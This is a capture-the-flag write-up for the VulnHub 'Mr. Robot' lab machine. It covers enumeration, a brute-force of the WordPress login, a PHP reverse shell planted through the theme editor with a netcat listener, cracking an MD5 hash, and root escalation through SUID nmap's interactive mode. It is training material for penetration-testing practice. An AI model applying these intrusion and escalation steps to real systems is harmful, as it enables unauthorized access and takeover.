# My writeup for MR. ROBOT machine
Machine link: https://www.vulnhub.com/entry/mr-robot-1,151/

Let's get started with nmap scan. I found three ports open for ssh, http, https

![nmap](https://github.com/moataz-bellah/writeups/assets/47069499/12744873-28e5-4421-a54b-483987e7d9db)
# Enumerate the website on port 80
When i explore a webiste i always start with /robots.txt to see unwanted paths

![robots](https://github.com/moataz-bellah/writeups/assets/47069499/4fafa00f-d27f-45c4-b6c4-d03ed1b97a38)
Here it is, we found flag 1 and an interesting file "fsosity.dic"
Going to /key-1-of-3.txt and we have flag 1 073403c8a58a1f80d943455fb30724b9
![flag1](https://github.com/moataz-bellah/writeups/assets/47069499/035767d7-e45d-4ac7-a2c8-fa83cc9ed8aa)
Let's check fsosity.dic later and continue enumeration. I did directory busting
```
sudo dirb http://192.168.0.105
```
I have a lot of directories, but i want to focus on three directories
```
http://192.168.0.105/0/
http://192.168.0.105/wp-admin/login
http://192.168.0.105/admin/robot
```
As we see it is a wordpress app. I went to /0/ and found a normal page has nothing to look for, so let's move to /wp-admin/login.
First thing i tried is login with default credentials of wordpress, but it didn't work. However i noticed somthing interesting.
![invalid_username](https://github.com/moataz-bellah/writeups/assets/47069499/d629ec5e-da2c-4333-bbc5-187baaaf0668)
As we see it tells me invalid username which means that page has poor validation. We can take advantage of that and brute force the username
and password. Back to fsocity.dic and explore it.
```
sort fsocity.dic | uniq > wordlist
true
false
wikia
from
the
now
Wikia
extensions
scss
window
```
It has random words, it seems to be a dictionary of usernames or passwords.
I checked to wordcount of the file
```
cat fsocity.dic | wc -l
858160
```
Let's see if that file has duplicates
```
sort fsocity.dic | uniq | wc -l
11451
```
As we see, we have a lot of duplicates. I created a new instance of that file without duplicates 
```
sort fsocity.dic | uniq > wordlist
```
Now we have a wordlist, let' see if it has username or password we can use to login.
Back to the login page, i tried a random username "elliot" and i was lucky.
![login](https://github.com/moataz-bellah/writeups/assets/47069499/e7c29d49-c17d-4369-a790-bddd6c0ced75)
That tells us the username we entered is correct and we just need to brute force the password.
I wrote a python script to brute force the password and also username
- Script to brute force username
![username_script](https://github.com/moataz-bellah/writeups/assets/47069499/3d325f5f-9a0e-4c51-89e0-1fe1b4dd175f)
- Script to brute force password
![password_script2](https://github.com/moataz-bellah/writeups/assets/47069499/877e92cf-5bb8-44f4-b2bd-c659336ed281)
After running the scripts we have the username: "elliot" and password: "ER28-0652". Let's login using these credentials
![dashboard](https://github.com/moataz-bellah/writeups/assets/47069499/cf3bfb4c-a19f-46e6-bd63-86ac486f31cd)
I was exploring the dashboard trying to find anything useful, but i didn't. So i did some research about ideas to get reverse shell in wordpress
and i found that great resourse https://www.hackingarticles.in/wordpress-reverse-shell/.
According to that link i went to appearance, then editor.
![reverse_shell2](https://github.com/moataz-bellah/writeups/assets/47069499/a02ef163-13f2-4bfd-b7a7-3beed04d069f)
1: I looked for a php reverse shell online and i found that https://github.com/pentestmonkey/php-reverse-shell, put it inside the editor.

2: Changed templates to 404 Template  

![reverse_shell](https://github.com/moataz-bellah/writeups/assets/47069499/20358daa-4e05-4470-85dd-b509e78c95ed)

3: Update File  

To get reverse shell we need to visit http://192.168.0.105/wp-content/themes/twentyfifteen/404.php. But before that we need to set netcat to
listen to any incoming connection
```
sudo nc -nvlp 4444
```
Now we execute the shell by visiting /wp-content/themes/twentyfifteen/404.php, and yeah we got a shell
![shell](https://github.com/moataz-bellah/writeups/assets/47069499/f21a4844-6fae-4b19-82ef-4b642bab8eb8)
Let's switch to pty
```
python -c 'import pty; pty.spawn("/bin/sh")'
```
Our current user is daemon. Let's visit /home
```
cd /home
ls
robot
```
See what inside robot
```
ls robot
key-2-of-3.txt  password.raw-md5
```
We have flag 2 but our user doesn't have permission to open, so we need to switch to robot user. Look we have interesting file password.raw-md5
```
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```
We have a username and a hashed password. Let's try to crack that hash. I tried that website and it worked https://crackstation.net/
and that is the cracked hash is "abcdefghijklmnopqrstuvwxyz". Let's switch to robot using that password
```
su robot
Password: abcdefghijklmnopqrstuvwxyz
robot@linux:~$
```
Yeah we are robot, and now we can read flag 2 
```
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```
# Privilege Escalation
After some research i found something called suid, that is something allows users executes files using the privileges of the owner of file.
Using that feature we can look for files that have setuid permission and owned by root user, so we can execute one of these files using privileges of root. 
That command below shows which files have suid permission.
```
robot@linux:/$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```
the option -perm -4000 means files has suid permession.According to the shown results, we have many files, but i want to focus on nmap.
I made a quick research on nmap and if we can get privilege escalation and i found that good link https://vk9-sec.com/nmap-privilege-escalation/  
```
robot@linux:/$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap>
```
I tried command !bash and didn't work, but when i tried !sh it worked
```
nmap> !sh
!sh
# whoami
root
#
```
Now we are root
Let't get the flag
```
# cd root
# ls
firstboot_done  key-3-of-3.txt
# cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```
Machine is done
